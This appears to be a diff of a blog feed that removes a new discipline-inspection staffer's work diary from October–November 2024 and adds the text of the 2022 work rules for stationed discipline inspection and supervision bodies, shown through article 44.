-<p>之后向郝书记汇报，郝书记考虑的很全面。</p>
-<p>1.水毁项目管护不到位：农田灌溉渠是什么时候开始堵的，堵了多久，项目的基本情况，管护职责，灌溉了多少亩农田，区域面积，高标准农田管护员是不是村干部，是不是党员，是什么身份等。</p>
-<p>2.水库未按设计图纸施工：当时为什么验收过了、有没有变更手续，责任在谁，业主、施工方、监理方等。</p>
-<blockquote>
-<p>1.处处留心皆学问。2.凡事都要考虑全面细致。3.沟通的艺术</p>
-</blockquote>
-<h2 id="2024-10-16"><a href="#2024-10-16" class="headerlink" title="2024.10.16"></a>2024.10.16</h2><p>上午继续整理汇报资料，写文章需要逐字逐句，认真细致，比如市纪委写的是关坡村，下面报上来的资料是官坡村，一个“guan”字就要打电话确认，包括文档中设计的一些规定，要知道是谁发布的，省、市、县还是县水利局。这些工作做完之后，去了组了，见到了HT哥，没有给我分配什么任务，他在整理上交的档案，让我给档案的文件夹写名字。</p>
-<p>下午HT哥出去办事，我在组里等创能中心的人，并给我交代做好接待工作，等党风室的人通知。下午创能中心的人没有来，三组喊我去修改文档，回来之后在办公室也没有什么活干，倒腾了一会打印机，会打印和复印了，顺便激活了电脑的系统，HT办完事回来给我说要请假一个月，并带我去楼上见了15监察室Y主任（421）交代了一下。未来一个月组里就剩我自己了，本来刚来认识的人就不多，组里的人都不在，有些忐忑和担忧，听说是组里案件少，不容易接触到办案，因此未来一个月工作我认为还是能够完成的不错的。但是案件少，还是有点担心这一个月干的都是打杂的，学不到东西，没成果，被边缘化。</p>
-<blockquote>
-<p>写文档要严谨。</p>
-</blockquote>
-<h2 id="2024-10-17"><a href="#2024-10-17" class="headerlink" title="2024.10.17"></a>2024.10.17</h2><p>上午学习《中国共产党纪律处分条例》（2018、2023年版），可能要开会，S主任会联系。</p>
-<p>下午继续学习《中国共产党纪律处分条例》，组里就我自己，开着门看着同事们来来往往，忙忙碌碌，感觉有点格格不入，希望有人来让我干点啥。</p>
-<p>下班去食堂吃饭，听到同批的同事都在聊今天干了什么，很多人都接触案件了，感觉很充实。真是旱的旱死，涝的涝死。希望明天能给我分配点任务。同时我也在思考我的核心竞争力是什么，有什么是我独一无二不可替代的。越想越烦。</p>
-<blockquote>
-<p>有些焦虑吧。</p>
-</blockquote>
-<h2 id="2024-10-18"><a href="#2024-10-18" class="headerlink" title="2024.10.18"></a>2024.10.18</h2><p>上午填了两张表，日常监督表格注意事项：1.单位名称填写全称，从省开始写；2.调研表方案或者报告全文复制；3.有问题根据政策写，根据xxx，xxx干了xxx。昨晚有同事加班到11点，不知道未来一个月我们组的工作是什么情况。</p>
-<p>下午也没有什么事情，就学习业务书籍，感觉同事们都很热心，有什么问题都会热心的解答。甚至下午来的技术人员会从下载浏览器开始教我登录内网基础班平台，哈哈哈，感觉很有意思。</p>
-<blockquote>
-<p>同事们都很好，人热心。</p>
-</blockquote>
-<h2 id="2024-10-21"><a href="#2024-10-21" class="headerlink" title="2024.10.21"></a>2024.10.21</h2><p>收以案促改材料。明天去政协开会。</p>
-<blockquote>
-<p>期待明天的到来。</p>
-</blockquote>
-<h2 id="2024-10-22"><a href="#2024-10-22" class="headerlink" title="2024.10.22"></a>2024.10.22</h2><p>上午学习二十届三中全会精神，学习《中共中央关于进一步全面深化改革、推进中国式现代化的决定》、《中国共产党第二十届中央委员会第三次全体会议公报》，并写了读后感。</p>
-<p>下午去政协开以案促改会议。</p>
-<blockquote>
-<p>逐步进入正轨，哈哈哈。</p>
-</blockquote>
-<h2 id="2024-10-23"><a href="#2024-10-23" class="headerlink" title="2024.10.23"></a>2024.10.23</h2><p>上午学习二十届三中全会精神，去党校考试，并且认识了公安局警令部主任，最美基层民警LXG，初心不改，坚守大山，我感觉他们都很伟大，能够真真正正的接触到群众的。</p>
-<p>进一步深化改革的总目标：<br>1.继续完善和发展中国特色社会主义制度。<br>2.推进国家治理体系和治理能力现代化。<br>3.到2035年，全面建成高水平社会主义市场经济体制。<br>4.中国特色社会主义制度更加完善。<br>5.基本实现国家治理体系和治理能力现代化。<br>6.基本实现社会主义现代化。</p>
-<p>完善城乡融合发展体制机制的主要部署：<br>1.健全推进新型城镇化体制机制。<br>2.巩固和完善农村基本经营制度。<br>3.完善强农惠农富农支持制度。<br>4.深化土地制度改革。<br>5.统筹新型工业化、新型城镇化和乡村全面振兴。<br>6.促进城乡要素平等交换、双向流动。</p>
-<p>把改革推向前进的必要性（六个必然要求）：<br>1.坚持和完善中国特色社会主义制度、推进国家治理体系和治理能力现代化的必然要求。<br>2.贯彻新发展理念、更好适应我国社会主要矛盾变化的必然要求。<br>3.坚持以人民为中心、让现代化建设成果更多更公平惠及全体人民的必然要求。<br>4.应对重大风险挑战、推动党和国家事业行稳致远的必然要求。<br>5.推动构建人类命运共同体、在百年变局加速演进中赢得战略主动的必然要求。<br>6.深入推进新时代党的建设新的伟大工程、建设更加坚强有力的马克思主义政党的必然要求。</p>
-<p>进一步全面深化改革必须坚持的六个原则：<br>1.坚持党的全面领导。<br>2.坚持以人民为中心。<br>3.坚持守正创新。<br>4.坚持以制度建设为主线。<br>5.坚持全面依法治国。<br>6.坚持系统观念。</p>
-<p>下午去3点去人大开以案促改会议，下午去党校开以案促改会议。感觉党校的同志都很热情，讲的时候也都在认真的记笔记，不是敷衍了事，向他们学习。</p>
-<blockquote>
-<p>1.很多表格都没有模板和格式，每个单位交上来的都不一样，感觉这样工作效率会低很多。</p>
-<p>2.需要联系的人很多，有点抵触打电话，有待加强。</p>
-<p>3.去开会有很多领导，都很热情，隆重介绍，一堆人跟在我后面，很不适应，感觉别扭。</p>
-<p>4.其他单位的领导可能对纪委监委的工作比我都熟悉，值得学习。</p>
-</blockquote>
-<h2 id="2024-10-24"><a href="#2024-10-24" class="headerlink" title="2024.10.24"></a>2024.10.24</h2><p>8点半去社会工作部开以案促改会议。之后收六个单位违规吃喝的情况说明，以案整改情况。</p>
-<blockquote>
-<p>1.注意纸质版和电子版是否都需要</p>
-<p>2.通知好是否需要盖章</p>
-<p>3.沟通的艺术</p>
-</blockquote>
-<h2 id="2024-10-25"><a href="#2024-10-25" class="headerlink" title="2024.10.25"></a>2024.10.25</h2><p>今天比较忙碌，晚上五点半开会分配任务，关于巡视巡察整改专项工作，设计对四个单位进行谈话，所有单位交促改材料、党纪学习教育材料，对四个单位（人大、政协、党校、档案馆）进行谈话等等。</p>
-<blockquote>
-<p>1.电脑设备太差，影响效率</p>
-<p>2.开会效果差，感觉材料应该先发给参会人。</p>
-<p>3.很多需要的东西格式、模板都没有统一标准，很麻烦。</p>
-<p>4.很多工作牵扯很多单位，需要配合，需要顾及其他单位，不利于开展工作。</p>
-</blockquote>
-<h2 id="2024-10-26"><a href="#2024-10-26" class="headerlink" title="2024.10.26"></a>2024.10.26</h2><p>今天很忙碌，很多收的材料都要补充其他材料，好在9个单位都很配合工作，县委办公室事情多，材料不能按时交。。。</p>
-<p>今天中午跟YWZ和LXB一起加班，我们这批刚刚入职的在工作中也渐渐熟悉起来，之前和他俩没什么交流，今天一起吃了饭，熟悉起来。</p>
-<blockquote>
-<p>1.谨慎。因违纪违法和违纪这个关键词搞错而复工，耽误了时间。</p>
-<p>2.感觉很多地方要求不明确，都要靠打听，可能本来就没有要求吧</p>
-</blockquote>
-<h2 id="2024-10-27"><a href="#2024-10-27" class="headerlink" title="2024.10.27"></a>2024.10.27</h2><p>约谈情况表最后一栏需要填写以后怎么做。补充日常监督内容。</p>
-<blockquote>
-<p>1.沟通的艺术（和县委办公室的负责人交流）</p>
-</blockquote>
-<h2 id="2024-10-28"><a href="#2024-10-28" class="headerlink" title="2024.10.28"></a>2024.10.28</h2><p>省委巡视和以案促改工作告一段落，这段时间收了十个单位的以案促改材料（照片、会议记录、班子成员自我剖析材料、台账、佐证材料、建章立制）。十个单位的党纪学习教育材料（会议记录、照片、方案、通知），违规吃喝整改材料和制度（人大、政协、办公室、党校、机关事务中心），四个单位的谈话（人大、政协、档案馆、党校），党校青年干部培训班的通知文件、培训名单、课程表、培训照片、体现习近平关于加强作风建设的相关内容。县委办24年关于第一议题的所有会议记录。</p>
-<blockquote>
-<p>感觉还是很有成就感的。</p>
-</blockquote>
-<h2 id="2024-10-29"><a href="#2024-10-29" class="headerlink" title="2024.10.29"></a>2024.10.29</h2><p>今天发了5张问题线索分办表，可能要办案子了吧，也想挑战一下自己。</p>
-<p>人大、政协、党校、县委办、机关事务中心的违规吃喝。</p>
-<blockquote>
-<p>感觉很多东西都没有明确的规定，比如台账的格式、内容；比如需要填写的签和表无固定格式；所有东西都要靠打听，感觉很难受。</p>
-</blockquote>
-<h2 id="2024-10-30"><a href="#2024-10-30" class="headerlink" title="2024.10.30"></a>2024.10.30</h2><p>制作了签、表、报告</p>
-<h2 id="2024-10-31"><a href="#2024-10-31" class="headerlink" title="2024.10.31"></a>2024.10.31</h2><p>政协来盖章（晋升材料）。</p>
-<h2 id="2024-11-01"><a href="#2024-11-01" class="headerlink" title="2024.11.01"></a>2024.11.01</h2><p>写专项行动报告，人大盖章、军工企业办事处盖章。</p>
-<p>今天可以转党员关系啦。</p>
-<h2 id="2024-11-04"><a href="#2024-11-04" class="headerlink" title="2024.11.04"></a>2024.11.04</h2><p>上午八点半培训。张黎《强化基层“小微权力”管控，筑牢基层执政根基》，申甲佳《如何开展留置内审的谈话工作》</p>
-<h2 id="2024-11-05"><a href="#2024-11-05" class="headerlink" title="2024.11.05"></a>2024.11.05</h2><p>无事</p>
-<h2 id="2024-11-06"><a href="#2024-11-06" class="headerlink" title="2024.11.06"></a>2024.11.06</h2><p>无事</p>
-<h2 id="2024-11-07"><a href="#2024-11-07" class="headerlink" title="2024.11.07"></a>2024.11.07</h2><p>下午三点，关于召开群众身边不正之风和腐败问题集中整治工作座谈推进会议</p>
-<h2 id="2024-11-08"><a href="#2024-11-08" class="headerlink" title="2024.11.08"></a>2024.11.08</h2><p>上午8:30-11:00党校四楼培训</p>
-<h2 id="2024-11-11"><a href="#2024-11-11" class="headerlink" title="2024.11.11"></a>2024.11.11</h2><p>金融整治工作。个人自查表、单位自查表、省辖市情况汇总表（表1到表5）、零报告汇总表。</p>
-<h2 id="2024-11-12"><a href="#2024-11-12" class="headerlink" title="2024.11.12"></a>2024.11.12</h2><p>金融整治纸质版、电子版交八室了。</p>
-<h2 id="2024-11-13"><a href="#2024-11-13" class="headerlink" title="2024.11.13"></a>2024.11.13</h2><p>无事</p>
-<h2 id="2024-11-14"><a href="#2024-11-14" class="headerlink" title="2024.11.14"></a>2024.11.14</h2><p>吃潮汕火锅，爬燕山</p>
-<h2 id="2024-11-15"><a href="#2024-11-15" class="headerlink" title="2024.11.15"></a>2024.11.15</h2><p>无事</p>
-<h2 id="2024-11-18"><a href="#2024-11-18" class="headerlink" title="2024.11.18"></a>2024.11.18</h2><p>上午八点半，强业务、促提升业务培训会。</p>
-<p>《财务账目审查与审计》王晓</p>
-<p>《农村集体经济三资管理》潘鹏</p>
-<h2 id="2024-11-19"><a href="#2024-11-19" class="headerlink" title="2024.11.19"></a>2024.11.19</h2><h2 id="2024-11-20"><a href="#2024-11-20" class="headerlink" title="2024.11.20"></a>2024.11.20</h2><p>写日常监督表（关于对机关事务中心开展违反中央八项规定精神的调研方案）</p>
-<h2 id="2024-11-21"><a href="#2024-11-21" class="headerlink" title="2024.11.21"></a>2024.11.21</h2><p>无事</p>
-<h2 id="2024-11-22"><a href="#2024-11-22" class="headerlink" title="2024.11.22"></a>2024.11.22</h2><p>无事</p>
-<h2 id="2024-11-25"><a href="#2024-11-25" class="headerlink" title="2024.11.25"></a>2024.11.25</h2><p>领关于纠治违规建设楼堂馆所、奢华装修问题的通知。</p>
+    <title>纪检监察机关派驻机构工作规则（2022年6月22日）</title>
+    <url>/2024/10/20/%E7%BA%AA%E6%A3%80%E7%9B%91%E5%AF%9F%E6%9C%BA%E5%85%B3%E6%B4%BE%E9%A9%BB%E6%9C%BA%E6%9E%84%E5%B7%A5%E4%BD%9C%E8%A7%84%E5%88%99%EF%BC%882022%E5%B9%B46%E6%9C%8822%E6%97%A5%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h2><p>  <strong>第一条</strong> 为了加强和规范纪检监察机关派驻机构工作，根据《中国共产党纪律检查委员会工作条例》和《中华人民共和国监察法》，制定本规则。</p>
+<p>  <strong>第二条</strong> 派驻机构工作坚持以习近平新时代中国特色社会主义思想为指导，增强“四个意识”、坚定“四个自信”、做到“两个维护”，坚持自我革命，坚持敢于斗争，坚持实事求是，深入贯彻全面从严治党战略方针，坚定不移推进党风廉政建设和反腐败斗争，建立健全系统集成、协同高效的派驻监督体制机制，增强“派”的权威和“驻”的优势，一体推进不敢腐、不能腐、不想腐，充分发挥监督保障执行、促进完善发展作用。</p>
+<p>  <strong>第三条</strong> 在党中央集中统一领导下，中央纪律检查委员会国家监察委员会向中央一级党和国家机关以及其他组织派驻纪检监察机构，地方各级纪律检查委员会监察委员会向本级党和国家机关以及其他组织派驻纪检监察机构。派驻机构是派出机关的组成部分，与驻在单位是监督和被监督的关系。</p>
+<p>  派驻机构应当强化政治监督，把坚持和加强党的领导贯穿工作全过程各方面，推动驻在单位切实做到“两个维护”，贯彻党的理论和路线方针政策，落实党中央决策部署。</p>
+<p>  <strong>第四条</strong> 派驻机构遵循以下原则开展工作：</p>
+<p>  （一）坚持党中央集中统一领导，强化组织自上而下的监督功能；</p>
+<p>  （二）坚持民主集中制，重要事项集体研究决定；</p>
+<p>  （三）坚持敢于善于监督，完善常态化监督工作机制；</p>
+<p>  （四）坚持职责定位，依规依纪依法履行职责；</p>
+<p>  （五）坚持各项监督统筹衔接，推动全面从严治党主体责任和监督责任一体落实；</p>
+<p>  （六）坚持监督与被监督相统一，自觉接受各方面监督。</p>
+<p>第五条 派驻机构应当持续深化转职能、转方式、转作风，聚焦全面从严治党、党风廉政建设和反腐败工作，强化监督职责，突出工作重点，创新履职方式，有效运用“四种形态”，增强派驻监督全覆盖的有效性，推动派驻监督工作高质量发展。</p>
+<h2 id="第二章-组织设置"><a href="#第二章-组织设置" class="headerlink" title="第二章 组织设置"></a>第二章 组织设置</h2><p>  <strong>第六条</strong> 中央纪律检查委员会国家监察委员会向中央一级党和国家机关、中管金融企业派驻纪检监察组。地方各级纪律检查委员会监察委员会向本级党和国家机关、所管辖的国有金融企业派驻纪检监察组。</p>
+<p>  中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会按照规定向国有企业、普通高等学校等单位派驻纪检监察组；或者依法派驻监察机构，派驻监察专员并设立监察专员办公室，与该单位党的纪律检查机构合署办公。</p>
+<p>  对系统规模大、直属单位多、监督对象多的单位，可以单独派驻纪检监察组；对业务关联度高，或者需要统筹力量实施监督的相关单位，可以综合派驻纪检监察组。</p>
+<p>  <strong>第七条</strong> 派驻机构主要负责人按照规定担任驻在单位的党组（党委）成员，履行监督专责，不分管驻在单位工作。</p>
+<p>  派驻机构主要负责人实行交流任职、定期轮岗。</p>
+<p>  <strong>第八条</strong> 派驻机构的领导机构是组务会。组务会由派驻机构正职、副职组成。组务会会议学习贯彻落实党中央决策部署，贯彻中央纪委国家监委工作部署，落实派出机关工作安排，研究讨论管辖范围内纪检监察工作的重要问题、重要事项，按照权限讨论或者决定党纪政务处分等事项。</p>
+<p>  派驻机构应当健全组务会会议以及组长办公会议、专题会议等会议制度，完善议事决策机制。</p>
+<p>  <strong>第九条</strong> 派驻机构应当按照信访举报、监督检查、审查调查、案件监督管理、案件审理相互协调、相互制约的原则，结合实际设置内设机构或者明确人员分工。</p>
+<h2 id="第三章-领导体制"><a href="#第三章-领导体制" class="headerlink" title="第三章 领导体制"></a>第三章 领导体制</h2><p>  <strong>第十条</strong> 各级党委应当加强对纪检监察机关派驻机构工作的领导，健全机构设置、干部管理、工作保障等机制，听取纪律检查委员会监察委员会关于派驻监督工作的汇报，推动派驻机构履职尽责。</p>
+<p>  <strong>第十一条</strong> 驻在单位应当支持配合派驻机构工作，主动及时通报重要情况、重要问题，根据派驻机构工作需要提供有关材料，为派驻机构开展工作创造条件、提供保障。</p>
+<p>  <strong>第十二条</strong> 派驻机构由派出机关直接领导、统一管理，向派出机关负责，受派出机关监督。</p>
+<p>  各级纪律检查委员会常务委员会应当定期听取派驻监督工作情况报告。派出机关分管领导应当定期召开派驻机构负责人会议，经常同派驻机构主要负责人研究工作。</p>
+<p>  <strong>第十三条</strong> 派出机关相关部门根据职能职责，加强对派驻机构的指导、联系、服务和保障。</p>
+<p>  监督检查部门协助分管领导联系派驻机构日常工作：</p>
+<p>  （一）指导督促派驻机构履行职责；</p>
+<p>  （二）对派驻机构请示报告的问题、事项进行审核把关；</p>
+<p>  （三）对派出机关交办的重要案件、事项进行督促办理；</p>
+<p>  （四）办理派驻机构提请支持、协调的重要事项；</p>
+<p>  （五）向派驻机构通报驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员的一般性问题和谈话提醒、批评教育、责令检查、诫勉谈话等情况；</p>
+<p>  （六）联系开展其他工作。</p>
+<p>  <strong>第十四条</strong> 派出机关相关部门应当会同派驻机构联合开展以下监督工作：</p>
+<p>  （一）开展专项检查，推动驻在单位落实党中央决策部署；</p>
+<p>  （二）研判驻在单位政治生态，有针对性地开展监督；</p>
+<p>  （三）开展专题调查研究，查找分析利用公共权力和资源设租寻租、离职后违规从业等行业性、系统性廉洁风险，向驻在单位提出意见建议或者督促开展专项治理；</p>
+<p>  （四）支持配合派出机关同级党委巡视巡察机构开展工作，对整改情况进行监督；</p>
+<p>  （五）推动驻在单位落实纪检监察建议；</p>
+<p>  （六）其他需要联合开展的监督工作。</p>
+<p>  <strong>第十五条</strong> 派出机关监督检查部门、审查调查部门对于派驻机构管辖的重大、复杂案件，经批准可以直接办理或者组织、指挥办理。</p>
+<p>  <strong>第十六条</strong> 派出机关相关部门应当指导、协调派驻机构与地方纪律检查委员会监察委员会协作开展以下工作：</p>
+<p>  （一）协同开展专项检查、专项监督，推动解决有关系统和领域的突出问题；</p>
+<p>  （二）协作采取监督检查、审查调查措施；</p>
+<p>  （三）协商确定驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件的管辖，或者由派驻机构报请派出机关指定有关地方纪委监委管辖；</p>
+<p>  （四）联合审查调查驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件；</p>
+<p>  （五）其他需要协作开展的工作。</p>
+<p>  <strong>第十七条</strong> 派出机关相关部门应当组织、指导各派驻机构之间协作配合开展以下工作：</p>
+<p>  （一）针对共性或者关联性问题同步开展专项监督；</p>
+<p>  （二）对重大、复杂案件进行联合审查调查；</p>
+<p>  （三）协作开展案件审理、复议复查和复审工作；</p>
+<p>  （四）对派出机关部署的重要工作落实情况开展交叉检查或者联合检查；</p>
+<p>  （五）联合开展调研、培训；</p>
+<p>  （六）其他需要协作配合开展的工作。</p>
+<p>  <strong>第十八条</strong> 派驻机构应当加强对驻在单位内设纪检机构及直属单位纪检机构的业务指导和监督检查，督促、支持其发挥职能作用，推动纪检干部队伍建设，加强政治教育和业务培训，协调人员力量开展监督执纪工作。</p>
+<p>  <strong>第十九条</strong> 派驻垂直管理单位的纪检监察组应当加强对驻在单位的下一级单位纪检机构的业务指导和监督检查，对驻在单位各级纪检机构的工作进行统筹，推动层层落实监督责任。下一级单位纪检机构的监督执纪工作以派驻纪检监察组领导为主，线索处置和案件查办在向同级党组（党委）报告的同时应当一并向派驻纪检监察组报告。</p>
+<p>  实行双重领导并以上级单位领导为主的单位，国有企业、国有金融企业的派驻机构工作，参照前款规定执行。</p>
+<p>  <strong>第二十条</strong>各级纪律检查委员会监察委员会派出的机关纪检监察工作委员会，按照规定审理有关派驻机构审查调查的案件，定期向派出机关报告案件审理工作情况。在派出机关领导下，建立健全案件质量评查机制，向派驻机构反馈评查结果。</p>
+<p>  机关纪检监察工作委员会应当加强与派驻机构的沟通协调，对本级党和国家机关部门机关纪委的执纪审查工作进行协同指导。</p>
+<p>  <strong>第二十一条</strong> 派驻国有资产监管机构、教育行政部门等的纪检监察组，按照规定协助派出机关加强对国有企业、普通高等学校等单位派驻机构工作的指导，形成监督合力。</p>
+<p>  派驻国有资产监管机构的纪检监察组，应当加强对驻在单位党组（党委）管理领导班子的国有企业纪检机构监督执纪工作的领导。相关国有企业纪检机构的线索处置和案件查办在向同级党委报告的同时，应当一并向派驻纪检监察组报告。</p>
+<h2 id="第四章-工作职责"><a href="#第四章-工作职责" class="headerlink" title="第四章 工作职责"></a>第四章 工作职责</h2><p>  <strong>第二十二条</strong> 派驻机构依规依纪依法履行监督执纪问责和监督调查处置职责。</p>
+<p>  <strong>第二十三条</strong> 派驻机构应当把监督作为基本职责，结合驻在单位实际，重点监督检查以下情况：</p>
+<p>  （一）对党忠诚，践行党的性质宗旨情况；</p>
+<p>  （二）贯彻党的理论和路线方针政策、落实党中央决策部署、践行“两个维护”情况；</p>
+<p>  （三）落实全面从严治党主体责任、加强党风廉政建设和反腐败工作情况；</p>
+<p>  （四）贯彻执行民主集中制、依规依法履职用权、廉洁自律等情况。</p>
+<p>  <strong>第二十四条</strong> 派驻机构应当重点监督以下对象：</p>
+<p>  （一）驻在单位领导班子及其成员特别是主要负责人；</p>
+<p>  （二）驻在单位上级党委管理的其他人员；</p>
+<p>  （三）驻在单位党组（党委）管理的领导班子及其成员；</p>
+<p>  （四）其他列入重点监督对象的驻在单位人员。</p>
+<p>  <strong>第二十五条</strong> 派驻机构应当支持和督促驻在单位党组（党委）落实全面从严治党主体责任，协助其开展内部巡视巡察，推动驻在单位深化改革、健全制度、完善治理、防控风险。</p>
+<p>  <strong>第二十六条</strong> 派驻机构应当结合派驻监督工作情况，推动驻在单位党组（党委）开展全面从严治党、党风廉政建设和反腐败工作的形势任务教育，强化纪法教育、警示教育，推进廉洁文化建设，教育引导党员、干部以及监察对象修身律己，筑牢思想道德防线。</p>
+<p>  <strong>第二十七条</strong> 派驻机构对反映驻在单位党组织和党员、干部以及监察对象问题的检举控告，按照规定受理和处置。</p>
+<p>  <strong>第二十八条</strong> 派驻机构对驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员涉嫌违纪和职务违法、职务犯罪问题线索，经批准可以参与派出机关的初步核实、审查调查工作。</p>
+<p>  <strong>第二十九条</strong> 派驻机构负责审查以下党组织和党员涉嫌违犯党纪的案件：</p>
+<p>  （一）驻在单位党组（党委）直接领导的党组织；</p>
+<p>  （二）驻在单位党组（党委）管理的领导班子成员；</p>
+<p>  （三）本规则第二十四条第四项规定的人员。</p>
+<p>  派驻机构必要时可以审查驻在单位党组（党委）管理的其他党组织和党员涉嫌违犯党纪的案件。</p>
+<p>  派驻机构根据派出机关授权，依法调查驻在单位监察对象涉嫌职务违法、职务犯罪案件。</p>
+<p>  <strong>第三十条</strong> 派驻机构按照管理权限，对违纪违法的驻在单位党组织和党员、干部以及监察对象进行处理处分，对不履行或者不正确履行职责的驻在单位党组织和领导干部进行问责。</p>
+<p>  <strong>第三十一条</strong> 派驻机构负责受理和处置以下申诉或者复审申请：</p>
+<p>  （一）党组织和党员对派驻机构所作处理决定不服的申诉；</p>
+<p>  （二）监察对象对派驻机构所作处理决定不服的复审申请；</p>
+<p>  （三）被调查人及其近亲属对派驻机构及其工作人员侵害被调查人合法权益行为的申诉。</p>
+<p>  对于派驻机构立案审查调查后由驻在单位作出处理决定案件的申诉或者复核申请，派驻机构应当协助驻在单位做好有关处置工作。</p>
+<h2 id="第五章-履职程序"><a href="#第五章-履职程序" class="headerlink" title="第五章 履职程序"></a>第五章 履职程序</h2><p>  <strong>第三十二条</strong> 派驻机构开展日常监督应当深入实际、深入群众，监督方式包括：</p>
+<p>  （一）参加会议。参加或者列席驻在单位领导班子会议等重要会议，了解学习贯彻党中央决策部署以及上级党组织决定情况和班子成员的意见态度，“三重一大”决策制度执行情况，按照规定向派出机关报告。</p>
+<p>  （二）谈心谈话。同党员、干部和群众广泛谈心谈话，听取对监督对象的反映，发现监督对象存在苗头性、倾向性问题的，进行谈话提醒、批评教育。</p>
+<p>  （三）听取汇报。听取驻在单位党组（党委）管理的领导班子及其成员履行管党治党责任情况的汇报，发现责任落实不到位的，进行提醒纠正。</p>
+<p>  （四）查阅资料。按照规定查阅、复制驻在单位有关文件、资料、数据等材料，了解核实有关情况。</p>
+<p>  （五）沟通情况。加强与驻在单位机关党委、党委办公室和组织人事、巡视巡察、法规法务、财务审计等部门的沟通，及时发现和通报问题。</p>
+<p>  （六）分析研判。分析信访举报、党风廉政等情况，对典型性、普遍性问题向驻在单位提出意见建议。</p>
+<p>  （七）廉政把关。建立健全、动态更新驻在单位党组（党委）管理的领导干部廉政档案，严把党风廉政意见回复关。</p>
+<p>  （八）实地调查。开展驻点调研、现场核查，精准发现驻在单位存在的突出问题。</p>
+<p>  （九）其他开展日常监督的方式。</p>
+<p>  <strong>第三十三条</strong> 派驻机构应当严格执行报告制度，发现驻在单位领导班子及其成员重要问题、重要事项及时向派出机关报告。</p>
+<p>  派驻机构应当经常对驻在单位领导班子及其成员坚持党的领导、加强党的建设、履行全面从严治党主体责任情况以及党风廉政状况进行分析，每年向派出机关提交专题报告。</p>
+<p>  &nbsp;<strong>第三十四条</strong> 派驻机构应当定期会同驻在单位党组（党委）专题研究全面从严治党、党风廉政建设和反腐败工作。派出机关监督检查部门根据情况派员参加。</p>
+<p>  派驻机构主要负责人应当经常与驻在单位党组（党委）主要负责人就政治生态、作风建设、廉洁风险等情况交换意见，提出工作建议，督促完善有关制度措施。</p>
+<p>  <strong>第三十五条</strong> 派驻机构应当向驻在单位领导班子成员通报其分管部门和单位领导干部遵守党章党规党纪、廉洁自律等情况，推动领导班子成员落实“一岗双责”要求，抓好分管部门和单位的党风廉政建设工作。</p>
+<p>  <strong>第三十六条</strong> 派驻机构对驻在单位开展内部巡视巡察提供以下协助：</p>
+<p>  （一）通报监督执纪执法中发现的问题；</p>
+<p>  （二）处置内部巡视巡察移交的问题线索；</p>
+<p>  （三）检查整改责任落实情况；</p>
+<p>  （四）其他协助内部巡视巡察的工作。</p>
+<p>  <strong>第三十七条</strong> 派驻机构应当指定专人负责管理涉嫌违纪和职务违法、职务犯罪问题线索，逐件编号登记，建立管理台账。</p>
+<p>  派驻机构应当结合日常监督掌握的情况，对问题线索进行综合分析、适当了解，采取谈话函询、初步核实、暂存待查、予以了结等方式进行处置。线索处置意见应当自收到线索之日起1个月内提出。</p>
+<p>  处置问题线索应当报派驻机构主要负责人审批，并按照规定报派出机关备案。</p>
+<p>  <strong>第三十八条</strong> 派驻机构经过初步核实，需要进行立案审查调查的，应当报派驻机构主要负责人审批。其中，对驻在单位党组（党委）直接领导的党组织、党组（党委）管理的领导班子成员中的正职领导干部立案和副职领导干部涉嫌严重职务违法、职务犯罪立案的，应当报派出机关审批。</p>
+<p>  派驻机构在立案前应当征求驻在单位党组（党委）主要负责人意见，对于有不同意见的应当报派出机关决定。确因安全保密等特殊情况，经派出机关同意，也可以在立案后及时向驻在单位党组（党委）主要负责人通报。</p>
+<p>  <strong>第三十九条</strong> 派驻机构按照规定报批后，可以依规依纪依法采取谈话、讯问、询问、留置、查询、冻结、搜查、调取、查封、扣押（暂扣、封存）、勘验检查、鉴定措施。对依法应当交有关机关执行的措施，报派出机关审批并以派出机关名义办理。</p>
+<p>  派驻机构应当对审查调查措施进行严格监管，建立措施使用台账，定期将有关情况报派出机关案件监督管理部门、监督检查部门备案。</p>
+<p>  <strong>第四十条</strong> 派驻机构审查调查工作结束后，应当按照规定进行审理，提出纪律处理或者党纪处分建议、拟作出的政务处分决定或者处分建议，通报驻在单位党组（党委）。</p>
+<p>  <strong>第四十一条</strong> 驻在单位党组（党委）按照权限和程序，对违纪的党组织、党员作出纪律处理或者党纪处分决定。</p>
+<p>  派驻机构按照管理权限，对违法的监察对象依法作出政务处分决定；建议驻在单位处分的，由驻在单位依法依规作出处分决定。</p>
+<p>  派驻机构提出的处理处分建议与驻在单位党组（党委）的意见不同又不能协商一致的，由派驻机构报派出机关研究决定。</p>
+<p>  <strong>第四十二条</strong> 派驻机构发现驻在单位党组（党委）管理的党组织和领导干部失职失责造成严重后果或者恶劣影响，需要进行问责调查的，应当报派驻机构主要负责人审批后，启动问责调查程序。</p>
+<p>  派驻机构应当依规依纪依法开展问责调查，查明失职失责问题，按照管理权限作出问责决定，或者向有权作出问责决定的党组织（单位）提出问责建议。</p>
+<p>  对党组织采取改组方式问责的，按照党章和其他党内法规规定的权限、程序执行。对领导干部采取党纪政务处分方式问责的，按照本规则第三十八条、第四十条、第四十一条办理。</p>
+<p>  <strong>第四十三条</strong> 派驻机构对调查的监察对象和涉案人员涉嫌职务犯罪案件，经集体审议，认为犯罪事实清楚，证据确实、充分，需要追究刑事责任的，依法依规移送人民检察院审查起诉。</p>
+<p>  <strong>第四十四条</strong> 派驻机构发现驻在单位在贯彻党中央决策部署、落实全面从严治党主体责任、开展党风廉政建设以及决策机制、监督管理、制度执行等方面存在突出问题或者薄弱环节的，应当提出纪检监察建议。</p>
+<p>派驻机构应当加强对驻在单位问题整改情况的监督检查，督促限期整改、反馈，推动纪检监察建议落实到位。</p>
